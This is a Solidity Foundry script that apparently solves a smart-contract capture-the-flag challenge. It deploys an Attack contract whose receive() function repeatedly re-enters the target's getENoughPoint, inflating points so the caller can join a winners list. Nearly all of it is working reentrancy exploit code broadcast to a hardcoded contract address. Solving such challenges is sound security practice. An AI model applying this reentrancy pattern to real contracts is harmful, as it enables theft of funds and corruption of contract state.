
// import {ChallengeTwo} from "./challengetwo.sol";

// contract AddYourName {
//     ChallengeTwo c2;

//     constructor(address _c2) {
//         c2 = ChallengeTwo(_c2);
//     }

//     function addName(string memory _name) external {
//         c2.passKey(33);

//         uint256 maxIters = 2048;
//         for (uint256 i = 0; i < maxIters; i++) {

//             string memory current = c2.Names(tx.origin);
//             if (keccak256(abi.encode(current)) != keccak256(abi.encode(""))) {
//                 break;
//             }
//             c2.getENoughPoint(_name);
//         }
        
//         c2.addYourName();
//     }

//     fallback() external payable {}
//     receive() external payable { }
// }













//SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.13;

import {Script, console} from "forge-std/Script.sol";

interface IChallenge {
    function passKey(uint8 _key) external;
    function getENoughPoint(string memory _name) external;
    function addYourName() external;
    function getAllwiners() external view returns (string[] memory _names);
    function userPoint(address) external view returns (uint256);
    function Names(address) external view returns (string memory);
}

contract Attack {
    IChallenge public target;
    uint256 public reentryCount;


    constructor(address _target) {
        target = IChallenge(_target);
    }

    function attack(string calldata _name, uint256 loops) external {
        reentryCount = loops; //25
        target.getENoughPoint(_name);
    }

    receive() external payable {
        if (reentryCount > 0) {
            reentryCount--;
            // Reenter the vulnerable function. tx.origin remains the EOA that initiated the attack/tx
            target.getENoughPoint("H4ck3d");
        }
    }
}

contract ChallengeTwoScript is Script {
    IChallenge public target;
    Attack public attacker;

    function run() public {
        target = IChallenge(0xF7D81431070e1efcF05EF8d69a17Be7daE90839f);

        vm.startBroadcast();
        
        console.log("===== Starting Challenge Two Hack =====");

        attacker = new Attack(address(0xF7D81431070e1efcF05EF8d69a17Be7daE90839f));

        //Pass stage one
        console.log("\n ==== Step One Passing Stage One ====");
        target.passKey(33);

        //Check Initial Stage
        console.log("\n ==== Step One Checking Initial Stage ====");
        console.log("Initial Name: ", target.Names(msg.sender)); //empty
        console.log("Initial Point: ", target.userPoint(msg.sender)); // 0

        //Pass Stage Two
        console.log("\n ==== Step Two Passing Stage Two ====");
        attacker.attack("H4ck3d", 24);

        //Check result after hack
        console.log("\n ==== Step Two Checking Result ====");
        console.log("Final Name: ", target.Names(msg.sender)); //H4ck3d
        console.log("Final Point: ", target.userPoint(msg.sender)); // 25


        //Complete the Challenge
        console.log("\n ==== Step Three Completing Challenge ====");
        target.addYourName();
        string[] memory winners = target.getAllwiners();
        console.log("Winners List: ");
        for (uint i = 0; i < winners.length; i++) { 
            console.log("Champion ", i + 1, ": ", winners[i]);
        }

        console.log("Challenge Completed!!");



        vm.stopBroadcast();
    }


}